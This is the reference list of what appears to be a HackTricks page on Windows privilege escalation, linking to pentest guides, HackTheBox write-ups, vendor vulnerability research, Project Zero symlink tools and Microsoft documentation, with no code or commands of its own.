- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
